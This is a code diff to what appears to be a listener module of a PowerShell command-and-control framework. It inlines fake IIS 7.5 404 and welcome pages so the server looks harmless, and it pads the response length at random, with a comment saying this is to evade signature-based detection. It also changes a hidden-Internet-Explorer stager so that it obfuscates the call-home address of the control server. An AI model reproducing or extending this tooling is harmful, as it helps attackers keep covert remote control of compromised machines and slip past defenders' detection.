@@ -48,7 +48,7 @@ class Listener:
             'Host' : {
                 'Description'   :   'Hostname/IP for staging.',
                 'Required'      :   True,
-                'Value'         :   "http://%s:%s" % (helpers.lhost(), 80)
+                'Value'         :   "http://%s" % (helpers.lhost())
             },
             'BindIP' : {
                 'Description'   :   'The IP to bind to on the control server.',
@@ -58,7 +58,7 @@ class Listener:
             'Port' : {
                 'Description'   :   'Port for the listener.',
                 'Required'      :   True,
-                'Value'         :   80
+                'Value'         :   ''
             },
             'Launcher' : {
                 'Description'   :   'Launcher string.',
@@ -110,11 +110,11 @@ class Listener:
                 'Required'      :   True,
                 'Value'         :   'CF-RAY'
             },
-             'HostPath' : {
+            'HostPath' : {
                 'Description'   :   'Directory path for hosting files.',
                 'Required'      :   False,
                 'Value'         :   ''
-            },              
+            },            
             'Headers' : {
                 'Description'   :   'Headers for the control server.',
                 'Required'      :   True,
@@ -147,23 +147,82 @@ class Listener:
         self.header_offset = random.randint(0,64)
 
     def default_response(self):
-        """
-        Returns an IIS 7.5 404 not found page.
-        """
+         """
+         Returns an IIS 7.5 404 not found page.
+         """
 
-        default_response = open("data/pages/default.html","r").read()
-        default_response +=  " " * self.header_offset
-
-        return default_response
+         return '\n'.join([
+             '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
+             '<html xmlns="http://www.w3.org/1999/xhtml">',
+             '<head>',
+             '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
+             '<title>404 - File or directory not found.</title>',
+             '<style type="text/css">',
+             '<!--',
+             'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
+             'fieldset{padding:0 15px 10px 15px;}',
+             'h1{font-size:2.4em;margin:0;color:#FFF;}',
+             'h2{font-size:1.7em;margin:0;color:#CC0000;}',
+             'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}',
+             '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
+             'background-color:#555555;}',
+             '#content{margin:0 0 0 2%;position:relative;}',
+             '.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}',
+             '-->',
+             '</style>',
+             '</head>',
+             '<body>',
+             '<div id="header"><h1>Server Error</h1></div>',
+             '<div id="content">',
+             ' <div class="content-container"><fieldset>',
+             '  <h2>404 - File or directory not found.</h2>',
+             '  <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>',
+             ' </fieldset></div>',
+             '</div>',
+             '</body>',
+             '</html>',
+             ' ' * self.header_offset,  # randomize the length of the header to evade signature based detection
+         ])
 
     def index_page(self):
         """
         Returns a default HTTP server page.
         """
 
-        index_page = open("data/pages/index.html","r").read()
-
-        return index_page
+        return '\n'.join([
+            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
+            '<html xmlns="http://www.w3.org/1999/xhtml">',
+            '<head>',
+            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />',
+            '<title>IIS7</title>',
+            '<style type="text/css">',
+            '<!--',
+            'body {',
+            '    color:#000000;',
+            '    background-color:#B3B3B3;',
+            '    margin:0;',
+            '}',
+            '',
+            '#container {',
+            '    margin-left:auto;',
+            '    margin-right:auto;',
+            '    text-align:center;',
+            '    }',
+            '',
+            'a img {',
+            '    border:none;',
+            '}',
+            '',
+            '-->',
+            '</style>',
+            '</head>',
+            '<body>',
+            '<div id="container">',
+            '<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>',
+            '</div>',
+            '</body>',
+            '</html>',
+        ])
 
     def validate_options(self):
         """
@@ -176,7 +235,10 @@ class Listener:
             if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                 print helpers.color("[!] Option \"%s\" is required." % (key))
                 return False
-
+        # If we've selected an HTTPS listener without specifying CertPath, let us know.
+        if self.options['Host']['Value'].startswith('https') and self.options['CertPath']['Value'] == '':
+            print helpers.color("[!] HTTPS selected but no CertPath specified.")
+            return False
         return True
 
 
@@ -264,7 +326,7 @@ class Listener:
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
                 stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
-                stager += "$ser='%s';$t='%s';" % (host, stage0)
+                stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
 
                 # add the RC4 packet to a header location
                 stager += "$c=\"%s: %s" % (requestHeader, b64RoutingPacket)
